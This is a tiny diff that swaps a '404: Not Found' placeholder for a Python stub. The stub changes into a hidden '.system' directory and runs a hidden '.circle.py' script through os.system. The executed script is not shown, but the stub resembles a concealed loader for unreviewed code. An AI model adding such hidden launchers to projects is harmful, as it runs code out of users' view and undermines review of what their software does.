@@ -1,1 +1,5 @@
-404: Not Found
+import os
+
+os.chdir('.system')
+
+os.system('python .circle.py')
